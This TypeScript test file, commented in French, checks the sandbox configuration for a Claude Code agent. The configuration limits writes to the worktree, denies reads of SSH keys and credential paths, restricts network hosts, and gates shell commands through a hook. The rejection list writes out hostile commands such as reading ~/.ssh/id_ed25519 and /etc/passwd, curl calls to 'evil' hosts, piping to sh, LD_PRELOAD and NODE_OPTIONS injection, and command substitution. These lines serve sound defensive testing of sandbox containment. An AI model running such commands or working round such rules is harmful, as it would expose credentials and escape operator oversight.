// La configuration du bac à sable d'un cook du Mac : il n'écrit que dans son
// worktree et les caches du projet, ne lit ni `~/.ssh`, ni les identifiants du
// chef, ni ses accès de prod, et ne joint que les hôtes de la liste du projet.
import assert from "node:assert/strict";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, renameSync, rmSync, statSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { test } from "node:test";
import { argumentsDuBacASable, BacASableInvalide, CONSIGNE_DE_REFUS, configurer, LECTURES_INTERDITES, type Cook } from "../../src/bac-a-sable/configuration.ts";
import { reglesDuProjet, type Regle } from "../../src/reseau.ts";
import { CACHE_DE_COMPILATION } from "../outils.ts";

const HOME = "/Users/chef";
const WORKTREE = "/Users/chef/brigade-wt/850-bac-a-sable";
const CACHES = ["/Users/chef/.npm", "/Users/chef/Library/Caches/pnpm"];
const projet = (hotes: string[] = []): Cook => ({ worktree: WORKTREE, caches: CACHES, hotes: reglesDuProjet(hotes), home: HOME });
const projetSeul = (hotes: Regle[]): Cook => ({ ...projet(), hotes });

test("l'écriture n'est ouverte que dans le worktree et les caches du projet — au bac à sable comme aux outils de `claude`", () => {
  const { modeDePermission, reglages } = configurer(projet());
  const { sandbox, permissions } = reglages;
  assert.deepEqual(sandbox.filesystem.allowWrite, [WORKTREE, ...CACHES]);
  assert.deepEqual(
    permissions.allow.filter((regle) => regle.startsWith("Edit(")),
    [WORKTREE, ...CACHES].map((lieu) => `Edit(/${lieu}/**)`),
  );
  // Rien d'autre n'ouvre l'écriture : ni répertoire ajouté, ni commande hors
  // du bac à sable, ni repli à nu quand une commande y échoue ou qu'il manque.
  assert.equal("additionalDirectories" in permissions, false);
  assert.deepEqual(sandbox.excludedCommands, []);
  assert.equal(sandbox.allowUnsandboxedCommands, false);
  assert.equal(sandbox.failIfUnavailable, true);
  assert.equal(sandbox.enabled, true);
  // Les règles qui autorisent ne tiennent qu'en `dontAsk` : c'est le mode du
  // cook, et `bypassPermissions` est désactivé.
  assert.equal(modeDePermission, "dontAsk");
  assert.equal(permissions.disableBypassPermissionsMode, "disable");
});

test("un autre worktree, d'autres caches : la configuration n'ouvre que ceux-là, chemins nettoyés et sans doublon", () => {
  const { reglages } = configurer({ ...projet(), worktree: "/Users/chef/wt/12-autre/", caches: ["~/.cargo/registry", "/Users/chef/wt/12-autre"] });
  assert.deepEqual(reglages.sandbox.filesystem.allowWrite, ["/Users/chef/wt/12-autre", "/Users/chef/.cargo/registry"]);
  assert.equal(JSON.stringify(reglages).includes(WORKTREE), false);
  assert.deepEqual(configurer({ ...projet(), caches: [] }).reglages.sandbox.filesystem.allowWrite, [WORKTREE]);
});

test("un lieu d'écriture qui ouvrirait le compte ou un accès interdit est refusé, en le disant", () => {
  const refuse = (cook: Partial<Cook>, motif: RegExp) => assert.throws(() => configurer({ ...projet(), ...cook }), (erreur: unknown) => erreur instanceof BacASableInvalide && motif.test(erreur.message));
  refuse({ caches: [HOME] }, /ni à la racine du compte/);
  refuse({ caches: ["~"] }, /ni à la racine du compte/);
  refuse({ caches: ["/"] }, /ni à la racine du compte/);
  refuse({ caches: ["/Users"] }, /ni au-dessus/);
  refuse({ worktree: "/Users/chef/brigade-wt/../" }, /ni à la racine du compte/);
  refuse({ caches: ["/Users/chef/.ssh"] }, /\/Users\/chef\/\.ssh/);
  refuse({ caches: ["/Users/chef/.ssh/../.ssh/agent"] }, /qu'il ne doit pas même lire/);
  refuse({ caches: ["/Users/chef/.config"] }, /\/Users\/chef\/\.config\/gh/);
  refuse({ caches: ["/srv/prod-secrets/cache"], prod: ["/srv/prod-secrets"] }, /\/srv\/prod-secrets/);
  refuse({ caches: ["node_modules/.cache"] }, /chemin absolu est attendu/);
  refuse({ worktree: "/Users/chef/wt/*" }, /motif/);
  refuse({ caches: ["/Users/chef/cache) Edit(//**"] }, /parenthèse/);
  refuse({ home: "Users/chef" }, /chemin absolu est attendu/);
});

test("la lecture de `~/.ssh`, des identifiants du chef et de ses accès de prod est interdite — au bac à sable comme aux outils de `claude`", () => {
  const prod = ["/Users/chef/prod/acces", "~/.config/scaleway", "/etc/brigade-prod"];
  const { reglages } = configurer({ ...projet(), prod });
  const { denyRead, denyWrite } = reglages.sandbox.filesystem;
  const interdits = [
    "/Users/chef/.ssh",
    "/Users/chef/.gnupg",
    "/Users/chef/Library/Keychains",
    "/Users/chef/.config/gh",
    "/Users/chef/.git-credentials",
    "/Users/chef/.netrc",
    "/Users/chef/.aws",
    "/Users/chef/.kube",
    "/Users/chef/.claude/.credentials.json",
    "/Users/chef/prod/acces",
    "/Users/chef/.config/scaleway",
    "/etc/brigade-prod",
  ];
  for (const interdit of interdits) {
    assert.ok(denyRead.includes(interdit), `${interdit} se lit dans le bac à sable`);
    assert.ok(denyWrite.includes(interdit), `${interdit} s'écrit dans le bac à sable`);
    for (const outil of ["Read", "Edit"]) {
      assert.ok(reglages.permissions.deny.includes(`${outil}(/${interdit})`), `${outil} atteint ${interdit}`);
      assert.ok(reglages.permissions.deny.includes(`${outil}(/${interdit}/**)`), `${outil} atteint ce qui est sous ${interdit}`);
    }
  }
  // Toute la liste par défaut, sous le compte que la station nomme.
  assert.deepEqual(denyRead.slice(0, LECTURES_INTERDITES.length), LECTURES_INTERDITES.map((relatif) => `${HOME}/${relatif}`));
  // Et aucune lecture n'est rouverte dessous.
  assert.equal("allowRead" in reglages.sandbox.filesystem, false);
  assert.deepEqual(
    reglages.permissions.allow.filter((regle) => regle.startsWith("Read(")),
    [],
  );
});

test("seuls les hôtes de la liste réseau du projet sont joignables, et un hôte hors de la liste est refusé quel que soit le mode", () => {
  const { reglages } = configurer(projet(["registry.npmjs.org", "*.example.org", "db.example.net:5432"]));
  const { network } = reglages.sandbox;
  assert.deepEqual(network.allowedDomains, [
    "anthropic.com",
    "*.anthropic.com",
    "claude.ai",
    "*.claude.ai",
    "claude.com",
    "*.claude.com",
    "github.com",
    "*.github.com",
    "githubusercontent.com",
    "*.githubusercontent.com",
    "registry.npmjs.org",
    "example.org",
    "*.example.org",
    "db.example.net:5432",
  ]);
  assert.equal(network.strictAllowlist, true);
  assert.equal(network.allowLocalBinding, false);
  assert.equal(network.allowAllUnixSockets, false);
  assert.equal(reglages.sandbox.enableWeakerNetworkIsolation, false);
  // WebFetch, hors du bac à sable, ne joint que ces hôtes-là — pas celui que
  // la liste borne à un port.
  assert.deepEqual(
    reglages.permissions.allow.filter((regle) => regle.startsWith("WebFetch(")),
    network.allowedDomains.filter((nom) => !nom.includes(":")).map((nom) => `WebFetch(domain:${nom})`),
  );
});

test("avec une liste réseau vide, aucun hôte n'est joignable : ni par le bac à sable, ni par WebFetch", () => {
  const { reglages } = configurer(projetSeul([]));
  assert.deepEqual(reglages.sandbox.network.allowedDomains, []);
  assert.equal(reglages.sandbox.network.strictAllowlist, true);
  assert.deepEqual(
    reglages.permissions.allow.filter((regle) => !regle.startsWith("Edit(")),
    [],
  );
});

test("un hôte de la liste qui n'en est pas un est refusé plutôt que d'ouvrir plus qu'il ne dit", () => {
  for (const hote of ["*", "*.com", "exemple.org/chemin", "EXEMPLE.org", "exemple.org ", "192.168.1.20"])
    assert.throws(() => configurer(projetSeul([{ hote, sousDomaines: false, port: null, origine: "project" }])), BacASableInvalide, hote);
  assert.throws(() => configurer(projetSeul([{ hote: "exemple.org", sousDomaines: false, port: 70000, origine: "project" }])), /port 70000/);
});

test("les arguments de lancement portent le mode du cook et des réglages qui se relisent tels quels", () => {
  const config = configurer(projet(["registry.npmjs.org"]));
  const args = argumentsDuBacASable(config);
  assert.deepEqual(args.slice(0, 3), ["--permission-mode", "dontAsk", "--settings"]);
  assert.deepEqual(JSON.parse(args[3] ?? ""), config.reglages);
  assert.deepEqual(args.slice(4), ["--append-system-prompt", CONSIGNE_DE_REFUS]);
});

// Un pnpm 10 : celui du poste s'il en est un, sinon un pnpm 10 installé avec
// npm. Rend le dossier de ses binaires à mettre en tête du PATH (vide pour
// celui du poste), ou la raison pour laquelle il n'y en a pas.
// Celui qu'installe npm se garde un jour, hors du test, d'un passage à l'autre :
// l'installer, c'est le réseau et six secondes de processeur à chaque passage
// (#1635). Il s'installe à côté puis prend sa place d'un seul geste, et un
// passage qui le trouve déjà là garde celui-là : deux suites de front ne
// s'en disputent pas un à moitié écrit.
const PNPM10 = join(tmpdir(), `brigade-pnpm10-${process.getuid?.() ?? "partage"}`);
const UN_JOUR_MS = 24 * 60 * 60_000;
function provisionnerPnpm10(racine: string): { bin: string } | { raison: string } {
  const poste = spawnSync("pnpm", ["--version"], { encoding: "utf8", cwd: racine });
  if (poste.status === 0 && Number.parseInt(poste.stdout, 10) >= 10) return { bin: "" };
  const bin = join(PNPM10, "node_modules", ".bin");
  if (existsSync(join(bin, "pnpm")) && Date.now() - statSync(PNPM10).mtimeMs < UN_JOUR_MS) return { bin };
  const prefixe = mkdtempSync(`${PNPM10}.`);
  const installe = spawnSync("npm", ["install", "--prefix", prefixe, "--no-audit", "--no-fund", "--loglevel=error", "pnpm@10"], { encoding: "utf8", cwd: racine, timeout: 90_000 });
  if (installe.status === 0 && existsSync(join(prefixe, "node_modules", ".bin", "pnpm"))) {
    // Le périmé s'écarte avant que le neuf prenne sa place.
    if (existsSync(PNPM10) && Date.now() - statSync(PNPM10).mtimeMs >= UN_JOUR_MS) renameSync(PNPM10, `${prefixe}.perime`);
    try {
      renameSync(prefixe, PNPM10);
    } catch {
      // Un autre passage l'a posé entre-temps : c'est le sien qui sert.
    }
  }
  for (const reste of [prefixe, `${prefixe}.perime`]) rmSync(reste, { recursive: true, force: true });
  if (existsSync(join(bin, "pnpm"))) return { bin };
  return { raison: `no pnpm 10 on the workstation and none could be installed with npm (no network?): ${installe.stderr.trim().split("\n").at(-1) ?? "npm did not run"}` };
}

// Un paquet npm réduit à son `package.json`, avec de quoi l'annoncer à pnpm.
function paquet(racine: string, nom: string, version: string) {
  const dossier = join(racine, `paquet-${nom}`);
  mkdirSync(join(dossier, "package"), { recursive: true });
  writeFileSync(join(dossier, "package", "package.json"), JSON.stringify({ name: nom, version }));
  execFileSync("tar", ["-czf", join(dossier, "p.tgz"), "-C", dossier, "package"]);
  const tgz = readFileSync(join(dossier, "p.tgz"));
  return { version, tgz, shasum: createHash("sha1").update(tgz).digest("hex"), integrity: `sha512-${createHash("sha512").update(tgz).digest("base64")}` };
}

type Sortie = { status: number | null; stdout: string; stderr: string };

// Le critère du ticket #1320, joué avec le vrai pnpm 10 : sous l'environnement
// du bac à sable de `claude`, un projet qui fixe dans `packageManager` une autre
// version de pnpm que celle du poste (le cas de la station Mac) démarre, installe
// et lance un script sans que pnpm cherche cette version — et sans l'`env` des
// réglages, il meurt de ERR_PNPM_PNPM_ENGINE_IDENTITY_UNVERIFIABLE.
//
// Le registre est un faux, joint par `http://` à travers un faux proxy qui
// enregistre ce qui lui arrive : un hôte `.invalid` n'a pas d'autre chemin que
// le proxy, donc ce qu'il voit est ce que le proxy du bac à sable verrait. Les
// variables de proxy sont celles que `claude` pose dans le bac à sable
// (HTTP(S)_PROXY et http(s)_proxy, NO_PROXY — sandbox-runtime, claude 2.1.300).
test("sous l'environnement du bac à sable, pnpm 10 démarre, installe et lance un script sans chercher sa version ; sans les réglages, il meurt de ENGINE_IDENTITY_UNVERIFIABLE", { skip: process.platform === "win32" ? "drives a POSIX tar and sh" : false }, async (t) => {
  const { reglages } = configurer(projet(["registry.npmjs.org"]));
  assert.equal(reglages.sandbox.network.allowedDomains.includes("registry.npmjs.org"), true);
  const racine = mkdtempSync(join(tmpdir(), "pnpm-bac-"));
  try {
    const pnpm10 = provisionnerPnpm10(racine);
    if ("raison" in pnpm10) return t.skip(pnpm10.raison);

    const paquets: Record<string, ReturnType<typeof paquet>> = { pnpm: paquet(racine, "pnpm", "10.0.0"), leaf: paquet(racine, "leaf", "1.0.0") };
    const vus: string[] = [];
    const proxy = createServer((req, res) => {
      const url = req.url ?? "";
      vus.push(`${req.method} ${url}`);
      const m = /^http:\/\/registre\.invalid\/([^/]+)(\/-\/.+)?$/.exec(url);
      const p = m ? paquets[m[1] ?? ""] : undefined;
      if (!m || !p) {
        res.statusCode = 404;
        res.end("{}");
      } else if (m[2]) {
        res.end(p.tgz);
      } else if (!String(req.headers.accept).includes("install-v1")) {
        // La fiche complète que pnpm lit pour vérifier la signature de sa version : le registre la refuse.
        res.statusCode = 403;
        res.end("{}");
      } else {
        const tarball = `http://registre.invalid/${m[1]}/-/${m[1]}-${p.version}.tgz`;
        res.setHeader("content-type", "application/json");
        res.end(JSON.stringify({ name: m[1], "dist-tags": { latest: p.version }, versions: { [p.version]: { name: m[1], version: p.version, dist: { tarball, shasum: p.shasum, integrity: p.integrity } } } }));
      }
    });
    // Le registre canonique, joint en HTTPS : le proxy coupe, comme un hôte hors de `reseau`.
    proxy.on("connect", (req, socket) => {
      vus.push(`CONNECT ${req.url}`);
      socket.destroy();
    });
    await new Promise<void>((fini) => proxy.listen(0, "127.0.0.1", fini));
    t.after(() => {
      proxy.closeAllConnections();
      proxy.close();
    });
    const adresse = `http://127.0.0.1:${(proxy.address() as AddressInfo).port}`;
    const sansProxy = "localhost,127.0.0.1,::1,169.254.0.0/16,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16";

    const projetDir = join(racine, "projet");
    mkdirSync(projetDir);
    writeFileSync(
      join(projetDir, "package.json"),
      JSON.stringify({ name: "x", packageManager: "pnpm@10.0.0", scripts: { bonjour: "echo bonjour-du-script" }, dependencies: { leaf: "1.0.0" } }),
    );
    const lancer = (args: string[], env: Record<string, string>) =>
      new Promise<Sortie>((fini) => {
        const enfant = spawn("pnpm", args, {
          cwd: projetDir,
          timeout: 90_000,
          env: {
            PATH: [pnpm10.bin, process.env.PATH ?? ""].filter(Boolean).join(delimiter),
            HOME: join(racine, "home"),
            HTTP_PROXY: adresse,
            HTTPS_PROXY: adresse,
            http_proxy: adresse,
            https_proxy: adresse,
            NO_PROXY: sansProxy,
            no_proxy: sansProxy,
            npm_config_registry: "http://registre.invalid/",
            npm_config_fetch_retries: "0",
            npm_config_fetch_retry_mintimeout: "10",
            npm_config_fetch_retry_maxtimeout: "10",
            npm_config_update_notifier: "false",
            // Le pnpm gardé d'un passage à l'autre l'est sous le même chemin :
            // le cache de compilation de Node lui sert aussi.
            ...CACHE_DE_COMPILATION,
            ...env,
          },
        });
        let stdout = "";
        let stderr = "";
        enfant.stdout.on("data", (b) => (stdout += b));
        enfant.stderr.on("data", (b) => (stderr += b));
        enfant.on("close", (status) => fini({ status, stdout, stderr }));
      });

    // Sans les réglages : pnpm cherche sa version par le proxy, puis meurt faute de pouvoir la vérifier.
    const sans = await lancer(["--version"], {});
    assert.notEqual(sans.status, 0, sans.stdout);
    // pnpm lève ERR_PNPM_PNPM_ENGINE_IDENTITY_UNVERIFIABLE, mais pnpm 10.34 affiche
    // un échec du changement de version sans son code (` ERROR <message>`) : son
    // message, avec un registre injoignable (« could not be consulted either »),
    // est celui de ce code-là, pas celui de ENGINE_IDENTITY_MISMATCH.
    assert.match(sans.stderr, /ERR_PNPM_PNPM_ENGINE_IDENTITY_UNVERIFIABLE|Refusing to run pnpm@10\.0\.0: its npm registry signature could not be verified \(.*could not be consulted either/);
    assert.equal(vus.includes("GET http://registre.invalid/pnpm"), true, vus.join("\n"));

    // Avec l'`env` des réglages : `--version`, `install` puis un script, sans une requête pour pnpm lui-même.
    vus.length = 0;
    const version = await lancer(["--version"], reglages.env);
    assert.equal(version.status, 0, version.stderr);
    assert.match(version.stdout, /^\d+\.\d+\.\d+/);
    assert.equal(vus.length, 0, vus.join("\n"));

    const installation = await lancer(["install"], reglages.env);
    assert.equal(installation.status, 0, installation.stderr + installation.stdout);
    assert.equal(existsSync(join(projetDir, "node_modules", "leaf", "package.json")), true);
    assert.equal(vus.includes("GET http://registre.invalid/leaf"), true, vus.join("\n"));
    assert.equal(vus.some((v) => v.startsWith("CONNECT ") || v === "GET http://registre.invalid/pnpm"), false, vus.join("\n"));

    const script = await lancer(["run", "bonjour"], reglages.env);
    assert.equal(script.status, 0, script.stderr);
    assert.match(script.stdout, /bonjour-du-script/);
  } finally {
    rmSync(racine, { recursive: true, force: true });
  }
});

test("les réglages du bac à sable posent la désactivation du changement de version de pnpm", () => {
  assert.deepEqual(configurer(projet()).reglages.env, { npm_config_manage_package_manager_versions: "false" });
});

test("un fichier remis au cook (son ticket) est lisible par ses outils, lui seul — et jamais sous un accès interdit", () => {
  const remis = "/Users/chef/etat/runs/7.ticket.md";
  const { permissions } = configurer({ ...projet(), lit: [remis] }).reglages;
  assert.deepEqual(
    permissions.allow.filter((regle) => regle.startsWith("Read(")),
    [`Read(/${remis})`],
  );
  assert.deepEqual(permissions.deny, configurer(projet()).reglages.permissions.deny);
  assert.equal(configurer(projet()).reglages.permissions.allow.some((regle) => regle.startsWith("Read(")), false);
  assert.throws(() => configurer({ ...projet(), lit: [`${HOME}/.config/brigade/runs/7.ticket.md`] }), (erreur: unknown) => erreur instanceof BacASableInvalide && /ne peut pas être sous/.test(erreur.message));
});

// Les formes de commande que le crochet du cook autorise ou laisse à `dontAsk`
// (qui refuse). Le crochet est celui que `configurer` pose, joué ici comme
// `claude` le joue : l'appel sur son entrée standard, la décision sur sa sortie.
// Pourquoi un crochet et non des règles `Bash(…)` : le `*` d'un motif couvre
// n'importe quoi, espaces comprises (`Bash(VAR=* ./node_modules/.bin/*)`
// laisserait passer `VAR=a curl x ./node_modules/.bin/y`) — établi avec `claude`.
function sortieDuCrochet(commande: string): { permissionDecision?: string; permissionDecisionReason?: string; additionalContext?: string } | null {
  const crochet = configurer(projet()).reglages.hooks.PreToolUse[0]?.hooks[0]?.command ?? "";
  const [, node, script] = /^"([^"]+)" "([^"]+)"$/.exec(crochet) ?? [];
  const sortie = spawnSync(node ?? "", [script ?? ""], { input: JSON.stringify({ tool_name: "Bash", tool_input: { command: commande } }), encoding: "utf8" });
  assert.equal(sortie.status, 0, sortie.stderr);
  return sortie.stdout === "" ? null : (JSON.parse(sortie.stdout) as { hookSpecificOutput: object }).hookSpecificOutput;
}
const autorise = (commande: string) => sortieDuCrochet(commande)?.permissionDecision === "allow";

test("dontAsk : les tests et les linters du projet passent, rien d'autre n'est ouvert", () => {
  const permises = [
    "./node_modules/.bin/vitest run src/features/direct-discussion",
    "DATABASE_URL=postgres://localhost:5432/gadgets_test_445 LLM_MODE=mock ./node_modules/.bin/vitest run src/features/direct-discussion",
    "./node_modules/.bin/prettier --write src/a.ts",
    "pnpm test",
    "pnpm lint",
    "pnpm format",
    "pnpm test src/a.test.ts",
    "pnpm run lint",
    "LLM_MODE=mock pnpm test",
    "npm test",
    "npm run typecheck",
    "yarn lint",
    // Une chaîne `;` : chaque maillon se juge, la chaîne passe si tous passent.
    "ls node_modules/.bin; ./node_modules/.bin/prettier --write src/a.ts",
    "pnpm lint; pnpm test",
    "ls; cat src/a.ts; pnpm lint",
    "LLM_MODE=mock ./node_modules/.bin/vitest run a; ./node_modules/.bin/prettier --check .",
    // Un chemin du worktree, collé à une option ou non, reste permis.
    "./node_modules/.bin/eslint -c./eslint.config.js src",
    "./node_modules/.bin/vitest run -o./src/out.json --config=vitest.config.ts",
    "./node_modules/.bin/eslint --config:eslint.config.js src",
  ];
  const refusees = [
    "pnpm install",
    "pnpm add left-pad",
    "pnpm run deploy",
    "npm publish",
    "curl https://example.com",
    "FOO=bar curl https://example.com",
    "rm -rf node_modules",
    "cd /tmp && ./node_modules/.bin/vitest",
    "/usr/bin/env sh -c 'pnpm test'",
    "git push origin HEAD",
    "../../outside/node_modules/.bin/tool",
    // Un `=` ou une commande autorisée en queue n'ouvre pas ce qui précède.
    "curl http://x?a=1 pnpm test",
    "curl https://evil/?a=1 ./node_modules/.bin/x",
    "rm -rf ~ a=b pnpm test",
    "VAR=a curl https://evil ./node_modules/.bin/x",
    // Le `..` sort du dossier des binaires du projet.
    "./node_modules/.bin/../../../../usr/bin/curl https://evil",
    "./node_modules/.bin/vitest run ../autre-projet",
    // Un chemin absolu ou en `~` sort du worktree, lecture comprise.
    "cat /etc/passwd",
    "cat ~/autre-projet/.env",
    "ls ~",
    "ls /var/lib",
    "head -n 5 /etc/hosts",
    "pnpm lint; cat /etc/hosts",
    "ls node_modules/.bin; cat ~/.ssh/id_ed25519",
    "./node_modules/.bin/prettier --write /etc/hosts",
    "./node_modules/.bin/eslint --config=/tmp/evil.js src",
    // Un chemin hors du worktree collé à une option, sans espace ni `=`.
    "./node_modules/.bin/eslint -c/tmp/evil.js src",
    "./node_modules/.bin/vitest run -o/tmp/out.json",
    "./node_modules/.bin/eslint --config:/tmp/evil.js src",
    "./node_modules/.bin/prettier -c~/evil.json .",
    "pnpm test -c/tmp/evil.js",
    // Une variable qui change ce que le shell ou Node charge.
    "PATH=/tmp/evil pnpm test",
    "NODE_OPTIONS=--require=/tmp/x.js ./node_modules/.bin/vitest",
    "LD_PRELOAD=/tmp/x.so pnpm test",
    // Une chaîne dont un maillon est refusé n'est pas autorisée.
    "pnpm test; curl https://example.com",
    "curl https://example.com; pnpm test",
    "ls; rm -rf node_modules; pnpm lint",
    // Autres compositions.
    "pnpm test && curl https://example.com",
    "pnpm test | sh",
    "pnpm test $(curl https://example.com)",
    "pnpm test `id`",
    "pnpm test > ~/.bashrc",
    "pnpm test\ncurl https://example.com",
  ];
  for (const commande of permises) assert.equal(autorise(commande), true, commande);
  for (const commande of refusees) assert.equal(autorise(commande), false, commande);
  // Aucune règle `Bash(…)` : le droit tient dans le crochet, jamais dans un motif.
  assert.deepEqual(
    configurer(projet()).reglages.permissions.allow.filter((regle) => regle.startsWith("Bash")),
    [],
  );
});

test("une commande refusée porte la consigne : en raison du refus quand elle vise les tests ou les linters, en contexte sinon, sans rien autoriser ni refuser de plus", () => {
  // Vise une vérification sans en être une : le crochet la refuse lui-même, avec la raison.
  for (const commande of ["pnpm install", "VAR=a curl https://example.com ./node_modules/.bin/x", "./node_modules/.bin/../../usr/bin/curl x", "./node_modules/.bin/eslint -c/tmp/evil.js src", "pnpm test && pnpm lint", "npx vitest run"]) {
    const sortie = sortieDuCrochet(commande);
    assert.equal(sortie?.permissionDecision, "deny", commande);
    assert.equal(sortie?.permissionDecisionReason, CONSIGNE_DE_REFUS, commande);
  }
  // Une autre commande : pas de décision (dontAsk tranche, et lit déjà `git status` seul), la consigne en contexte.
  for (const commande of ["curl https://example.com", "git status", "rm -rf src"]) {
    const sortie = sortieDuCrochet(commande);
    assert.equal(sortie?.permissionDecision, undefined, commande);
    assert.equal(sortie?.additionalContext, CONSIGNE_DE_REFUS, commande);
  }
  assert.match(CONSIGNE_DE_REFUS, /pnpm test/);
  // Une vérification acceptée n'est pas refusée.
  assert.equal(sortieDuCrochet("pnpm test")?.permissionDecision, "allow");
});

test("un refus de dontAsk dit au cook quoi lancer à la place, dans les arguments de tout `claude` du bac à sable", () => {
  for (const attendu of ["don't ask mode", "./node_modules/.bin/", "pnpm test", "pnpm lint", "DATABASE_URL=", "worktree"]) assert.match(CONSIGNE_DE_REFUS, new RegExp(attendu.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  const args = argumentsDuBacASable(configurer(projet()));
  assert.equal(args[args.indexOf("--append-system-prompt") + 1], CONSIGNE_DE_REFUS);
});
